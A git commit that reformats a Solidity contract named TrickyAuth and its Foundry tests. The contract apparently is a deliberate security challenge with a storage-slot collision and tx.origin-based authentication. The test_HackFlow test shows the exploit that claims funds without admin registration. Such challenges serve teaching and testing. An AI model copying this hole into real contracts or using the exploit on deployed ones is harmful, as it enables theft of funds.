f3ec4129e73a05e90b2dfe2f9627fa764a953146
SteMak <chestedos@gmail.com>
2024-11-04 14:15:56 +0100

    reformat

--- src/TrickyAuth.sol
+++ src/TrickyAuth.sol
@@ -2,74 +2,74 @@
 pragma solidity 0.8.26;
 
 contract TrickyAuth {
-  address admin;
-  mapping(bytes32 => address) authKeyToUser;
+    address admin;
+    mapping(bytes32 => address) authKeyToUser;
 
-  modifier onlyAdmin() {
-    require(admin == msg.sender, NotAdmin());
-    _;
-  }
-
-  modifier onlyRegistered(bytes32 key) {
-    require(authKeyToUser[key] == tx.origin, NotRegistered());
-    _;
-  }
-
-  struct Proposal {
-    address user;
-    bytes32 key;
-  }
-
-  error NotAdmin();
-  error NotRegistered();
-
-  event Register(address user, bytes32 key);
-  event RegisterMe(address user, bytes32 key);
-  event Claim(address user);
-
-  constructor() payable {
-    admin = msg.sender;
-  }
-
-  // Anyone can propose a key for the admin to accept
-  function proposeKey(bytes32 key) external {
-    Proposal storage proposal;
-    assembly {
-      mstore(0x00, origin())
-      mstore(0x20, key)
-      proposal.slot := keccak256(0x00, 0x40)
+    modifier onlyAdmin() {
+        require(admin == msg.sender, NotAdmin());
+        _;
     }
-    proposal.user = tx.origin;
-    proposal.key = key;
-    emit RegisterMe(tx.origin, key);
-  }
 
-  // Admin accepts the key to allow the claim
-  function register(bytes32 storageKey) external onlyAdmin {
-    Proposal storage proposal;
-    assembly {
-      proposal.slot := storageKey
+    modifier onlyRegistered(bytes32 key) {
+        require(authKeyToUser[key] == tx.origin, NotRegistered());
+        _;
     }
-    authKeyToUser[proposal.key] = proposal.user;
-    emit Register(proposal.user, proposal.key);
-  }
 
-  // Create2 opcode protects from double distribution
-  function claim(bytes32 key) external onlyRegistered(key) {
-    new Destructive{ salt: bytes32(bytes20(tx.origin)), value: 0x0100000000000000 }();
-    emit Claim(tx.origin);
-  }
+    struct Proposal {
+        address user;
+        bytes32 key;
+    }
+
+    error NotAdmin();
+    error NotRegistered();
+
+    event Register(address user, bytes32 key);
+    event RegisterMe(address user, bytes32 key);
+    event Claim(address user);
+
+    constructor() payable {
+        admin = msg.sender;
+    }
+
+    // Anyone can propose a key for the admin to accept
+    function proposeKey(bytes32 key) external {
+        Proposal storage proposal;
+        assembly {
+            mstore(0x00, origin())
+            mstore(0x20, key)
+            proposal.slot := keccak256(0x00, 0x40)
+        }
+        proposal.user = tx.origin;
+        proposal.key = key;
+        emit RegisterMe(tx.origin, key);
+    }
+
+    // Admin accepts the key to allow the claim
+    function register(bytes32 storageKey) external onlyAdmin {
+        Proposal storage proposal;
+        assembly {
+            proposal.slot := storageKey
+        }
+        authKeyToUser[proposal.key] = proposal.user;
+        emit Register(proposal.user, proposal.key);
+    }
+
+    // Create2 opcode protects from double distribution
+    function claim(bytes32 key) external onlyRegistered(key) {
+        new Destructive{ salt: bytes32(bytes20(tx.origin)), value: 0x0100000000000000 }();
+        emit Claim(tx.origin);
+    }
 }
 
 contract Destructive {
-  address owner;
+    address owner;
 
-  constructor() payable {
-    owner = tx.origin;
-  }
+    constructor() payable {
+        owner = tx.origin;
+    }
 
-  // No actual destruction happens after Cancun fork
-  function claim() external {
-    selfdestruct(payable(owner));
-  }
+    // No actual destruction happens after Cancun fork
+    function claim() external {
+        selfdestruct(payable(owner));
+    }
 }
--- test/TrickyAuth.t.sol
+++ test/TrickyAuth.t.sol
@@ -5,57 +5,57 @@ import { Test } from "forge-std/Test.sol";
 import { TrickyAuth, Destructive } from "../src/TrickyAuth.sol";
 
 contract CounterTest is Test {
-  TrickyAuth public CT;
-  uint256 constant CT_BALANCE = 0x1000000000000000;
-  address admin = address(0x12);
+    TrickyAuth public CT;
+    uint256 constant CT_BALANCE = 0x1000000000000000;
+    address admin = address(0x12);
 
-  function setUp() public {
-    payable(admin).transfer(CT_BALANCE);
+    function setUp() public {
+        payable(admin).transfer(CT_BALANCE);
 
-    vm.prank(admin);
-    CT = new TrickyAuth{ value: CT_BALANCE }();
-  }
-
-  function destructive() internal view returns (Destructive addr) {
-    bytes32 codehash = keccak256(abi.encodePacked(type(Destructive).creationCode));
-    address deployer = address(CT);
-    bytes32 salt = bytes20(tx.origin);
-
-    assembly {
-      let ptr := mload(0x40)
-
-      mstore(add(ptr, 0x40), codehash)
-      mstore(add(ptr, 0x20), salt)
-      mstore(ptr, deployer)
-
-      let start := add(ptr, 0x0b)
-      mstore8(start, 0xff)
-      addr := keccak256(start, 85)
+        vm.prank(admin);
+        CT = new TrickyAuth{ value: CT_BALANCE }();
     }
-  }
 
-  function test_HackFlow() public {
-    uint256 pre = tx.origin.balance;
+    function destructive() internal view returns (Destructive addr) {
+        bytes32 codehash = keccak256(abi.encodePacked(type(Destructive).creationCode));
+        address deployer = address(CT);
+        bytes32 salt = bytes20(tx.origin);
 
-    CT.proposeKey(bytes32(uint256(1)));
-    CT.claim(bytes32(uint256(uint160(tx.origin))));
-    destructive().claim();
+        assembly {
+            let ptr := mload(0x40)
 
-    assertEq(tx.origin.balance, pre + CT_BALANCE / 16);
-  }
+            mstore(add(ptr, 0x40), codehash)
+            mstore(add(ptr, 0x20), salt)
+            mstore(ptr, deployer)
 
-  function test_NormalFlow() public {
-    bytes32 key = bytes32(uint256(0x17));
-    uint256 pre = tx.origin.balance;
+            let start := add(ptr, 0x0b)
+            mstore8(start, 0xff)
+            addr := keccak256(start, 85)
+        }
+    }
 
-    CT.proposeKey(key);
+    function test_HackFlow() public {
+        uint256 pre = tx.origin.balance;
 
-    vm.prank(admin);
-    CT.register(keccak256(bytes.concat(bytes32(uint256(uint160(tx.origin))), key)));
+        CT.proposeKey(bytes32(uint256(1)));
+        CT.claim(bytes32(uint256(uint160(tx.origin))));
+        destructive().claim();
 
-    CT.claim(key);
-    destructive().claim();
+        assertEq(tx.origin.balance, pre + CT_BALANCE / 16);
+    }
 
-    assertEq(tx.origin.balance, pre + CT_BALANCE / 16);
-  }
+    function test_NormalFlow() public {
+        bytes32 key = bytes32(uint256(0x17));
+        uint256 pre = tx.origin.balance;
+
+        CT.proposeKey(key);
+
+        vm.prank(admin);
+        CT.register(keccak256(bytes.concat(bytes32(uint256(uint160(tx.origin))), key)));
+
+        CT.claim(key);
+        destructive().claim();
+
+        assertEq(tx.origin.balance, pre + CT_BALANCE / 16);
+    }
 }
